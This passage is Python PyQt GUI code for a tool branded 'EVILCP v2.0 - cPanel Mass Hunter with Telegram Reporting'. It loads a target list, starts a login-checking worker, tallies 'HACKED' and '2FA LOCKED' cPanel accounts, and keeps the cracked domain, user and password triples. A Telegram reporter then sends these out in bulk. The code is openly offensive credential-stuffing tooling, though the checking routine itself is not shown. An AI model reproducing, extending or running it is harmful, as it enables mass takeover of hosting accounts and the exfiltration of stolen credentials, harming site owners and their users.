                border: 2px solid #FF0000;
                background-color: #000000;
            }
            QTabBar::tab {
                background-color: #330000;
                color: #FF6666;
                padding: 10px;
                margin-right: 2px;
                border: 1px solid #FF0000;
            }
            QTabBar::tab:selected {
                background-color: #FF0000;
                color: #FFFFFF;
            }
            QTabBar::tab:hover {
                background-color: #FF3333;
                color: #FFFFFF;
            }
        """)
        
        main_layout.addWidget(self.tab_widget)

        # Footer
        footer_label = QLabel('<a href="https://github.com/xghost123" style="color: #FF0000; text-decoration: none; font-weight: bold;">🔥 EVILCP v2.0 by xghost123 🔥</a>')
        footer_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        footer_label.setOpenExternalLinks(True)
        main_layout.addWidget(footer_label)

        central_widget.setLayout(main_layout)
        self.apply_styles()

    def open_telegram_config(self):
        """Open Telegram configuration dialog"""
        self.config_dialog = TelegramConfigDialog(self)
        self.config_dialog.show()

    def send_telegram_report(self):
        """Send report to Telegram"""
        if not self.telegram_reporter:
            self.log_message("❌ Telegram not configured!")
            return
            
        if not self.hacked_list:
            self.log_message("❌ No hacked cPanels to report!")
            return
            
        self.log_message("📡 Sending bulk report to Telegram...")
        success, message = self.telegram_reporter.send_bulk_report(
            self.hacked_list,
            obfuscate=self.config['telegram']['obfuscate_data']
        )
        
        if success:
            self.log_message(f"✅ {message}")
        else:
            self.log_message(f"❌ {message}")

    def log_message(self, message):
        """Add message to log"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {message}"
        self.logs_text.append(log_entry)
        # Auto-scroll to bottom
        scrollbar = self.logs_text.verticalScrollBar()
        scrollbar.setValue(scrollbar.maximum())

    def browse_file(self):
        """Browse for file"""
        self.file_path, _ = QFileDialog.getOpenFileName(self, "Select Target File", "", "Text Files (*.txt);;All Files (*)")
        if self.file_path:
            self.textbox.setText(self.file_path)
            self.status_label.setText("STATUS: FILE LOADED - READY TO ATTACK")
            self.send_report_btn.setEnabled(True)

    def start_action(self):
        """Start checking process"""
        if not self.file_path:
            self.status_label.setText("STATUS: ERROR - NO FILE SELECTED!")
            self.log_message("❌ No file selected!")
            return
        
        if self.is_running:
            return
            
        self.is_running = True
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.hacked_list = []
        
        # Clear previous results
        self.tree_widget.clear()
        self.success_label.setText("HACKED: 0")
        self.locked_label.setText("2FA LOCKED: 0")
        self.failed_label.setText("FAILED: 0")
        self.logs_text.clear()
        
        self.worker = CheckLogin_Task(
            self.file_path, 
            self.telegram_reporter,
            self.config['telegram']['send_immediately']
        )

        self.worker.signals.Total_Lists.connect(self.total_list)
        self.worker.signals.CP_Success.connect(self.success_cp)
        self.worker.signals.CP_2FA.connect(self.count_2fa)
        self.worker.signals.CP_Failed.connect(self.login_failed)
        self.worker.signals.CP_Success_Count.connect(self.success_count)
        self.worker.signals.CP_Remaining.connect(self.remaining)
        self.worker.signals.Progress.connect(self.update_progress)
        self.worker.signals.Report_Sent.connect(self.handle_report_result)
        
        self.threadpool.start(self.worker)
        self.status_timer.start(100)
        self.status_label.setText("STATUS: ATTACK IN PROGRESS...")
        self.log_message("⚡ Attack started!")

    def handle_report_result(self, success, message):
        """Handle Telegram report result"""
        if success:
            self.log_message(f"📡 Telegram: {message}")
        else:
            self.log_message(f"⚠ Telegram Error: {message}")

    def stop_action(self):
        """Stop checking process"""
        if self.worker:
            self.worker.stop()
            self.is_running = False
            self.start_button.setEnabled(True)
            self.stop_button.setEnabled(False)
            self.status_timer.stop()
            self.status_label.setText("STATUS: ATTACK STOPPED BY USER")
            self.progress_bar.setValue(0)
            self.log_message("🛑 Attack stopped by user")

    def open_folder(self):
        """Open results folder"""
        folder_path = os.path.join(os.getcwd(), 'EVILCP_RESULTS')
        if os.path.exists(folder_path):
            open_file_or_folder(folder_path)
        else:
            os.makedirs(folder_path, exist_ok=True)
            open_file_or_folder(folder_path)

    def update_progress(self, value):
        """Update progress bar"""
        self.progress_bar.setValue(value)

    def update_status(self):
        """Update status with animation"""
        self.status_counter += 1
        dots = "." * (self.status_counter % 4)
        if self.is_running:
            self.status_label.setText(f"STATUS: ATTACKING{dots}")
        
        # Flash success label when new success
        if self.status_counter % 10 == 0:
            original_style = self.success_label.styleSheet()
            self.success_label.setStyleSheet(original_style.replace("#00FF00", "#FFFFFF"))
            QTimer.singleShot(100, lambda: self.success_label.setStyleSheet(original_style))

    def success_count(self, value):
        """Update success count display"""
        self.success_label.setText(f"HACKED: {value}")

    def total_list(self, value):
        """Update total list count"""
        self.total_count = value
        self.total_label.setText(f"TARGETS: {value}")
        self.update_remaining_label()

    def remaining(self, value):  
        """Update remaining count"""
        self.processed_count = value
        self.update_remaining_label()

    def update_remaining_label(self):
        """Update the remaining label"""
        remaining = self.total_count - self.processed_count
        if remaining > 0:
            self.total_label.setText(f"TARGETS: {self.total_count} | REMAINING: {remaining}")
        else:
            self.total_label.setText(f"TARGETS: {self.total_count} | COMPLETED ✓")
            if self.is_running:
                self.is_running = False
                self.start_button.setEnabled(True)
                self.stop_button.setEnabled(False)
                self.status_timer.stop()
                self.status_label.setText("STATUS: ATTACK COMPLETED")
                self.progress_bar.setValue(100)
                self.log_message("🏁 Attack completed successfully!")

    def toggle_changed(self, state):
        """Toggle masked/unmasked display"""
        self.tree_widget.setUpdatesEnabled(False)
        is_checked = bool(state) 
        row_count = self.tree_widget.topLevelItemCount()

        for row in range(row_count):
            item = self.tree_widget.topLevelItem(row)

            real_domain = item.data(0, Qt.ItemDataRole.UserRole) or item.text(0)
            real_user = item.data(1, Qt.ItemDataRole.UserRole) or item.text(1)
            real_pass = item.data(2, Qt.ItemDataRole.UserRole) or item.text(2)

            if is_checked:
                item.setText(0, funct_masked_domain(real_domain))
                item.setText(1, masked_random(real_user))
                item.setText(2, masked_random(real_pass))
            else:
                item.setText(0, real_domain)
                item.setText(1, real_user)
                item.setText(2, real_pass)

        self.tree_widget.setUpdatesEnabled(True)

    def success_cp(self, cp_domain, cp_user, cp_password):
        """Add successful cPanel to tree"""
        item = QTreeWidgetItem([
            funct_masked_domain(cp_domain),
            masked_random(cp_user),
            masked_random(cp_password)
        ])

        item.setData(0, Qt.ItemDataRole.UserRole, cp_domain)
        item.setData(1, Qt.ItemDataRole.UserRole, cp_user)
        item.setData(2, Qt.ItemDataRole.UserRole, cp_password)

        # Color code based on port
        if ':2083' in cp_domain:
            for i in range(3):
                item.setForeground(i, QColor("#00FF00"))  # Green for secure
        elif ':2082' in cp_domain:
            for i in range(3):
                item.setForeground(i, QColor("#FFFF00"))  # Yellow for standard
        else:
            for i in range(3):
                item.setForeground(i, QColor("#FF6666"))  # Red for unknown

        self.tree_widget.addTopLevelItem(item)
        self.tree_widget.scrollToItem(item)
        
        # Add to hacked list for Telegram reporting
        self.hacked_list.append((cp_domain, cp_user, cp_password))

    def count_2fa(self, value):
        """Update 2FA count"""
        self.locked_label.setText(f"2FA LOCKED: {value}")

    def login_failed(self, value):
        """Update failed count"""
        self.failed_label.setText(f"FAILED: {value}")

    def apply_styles(self):
        """Apply stylesheet to UI"""
        self.setStyleSheet("""
            QMainWindow {
                background-color: #000000;
            }
            QPushButton {
                background-color: #FF0000;
                color: white;
                border: 2px solid #FF3333;
                border-radius: 5px;
                padding: 5px;
                font-size: 14px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #FF3333;
                border: 2px solid #FF6666;
            }
            QPushButton:pressed {
                background-color: #990000;
            }
            QPushButton:disabled {
                background-color: #444444;
                color: #888888;
                border: 2px solid #666666;
            }
            QLineEdit {
                background-color: #111111;
                color: #00FF00;
                border: 2px solid #FF0000;
                border-radius: 3px;
                padding: 8px;
                font-size: 14px;
                selection-background-color: #FF0000;
            }
            QLineEdit:focus {
                border: 2px solid #00FF00;
            }
            QTreeWidget {
                background-color: #111111;
                color: #00FF00;
                border: 2px solid #FF0000;
                border-radius: 3px;
                font-size: 12px;
                alternate-background-color: #1A1A1A;
            }
            QTreeWidget::item {
                padding: 5px;
                border-bottom: 1px solid #333333;
            }
            QTreeWidget::item:selected {
                background-color: #FF0000;
                color: white;
            }
            QTreeWidget::item:hover {
                background-color: #222222;
            }
            QHeaderView::section {
                background-color: #330000;
                color: #FF0000;
                font-weight: bold;
                padding: 5px;
                border: 1px solid #FF0000;
            }
            QLabel {
                color: #CCCCCC;
            }
            QTextEdit {
                background-color: #111111;
                color: #00FF00;
                border: 1px solid #FF0000;
                font-family: 'Courier New', monospace;
            }
            QGroupBox {
                color: #FF0000;
                border: 2px solid #FF0000;
                border-radius: 5px;
                margin-top: 10px;
                font-weight: bold;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
            }
        """)


if __name__ == "__main__":
    app = QApplication(sys.argv)
    
    # Set application style
    app.setStyle('Fusion')
    
    window = FileBrowserApp()
    window.setWindowTitle("EVILCP v2.0 - cPanel Mass Hunter with Telegram Reporting")
    window.show()
    sys.exit(app.exec())
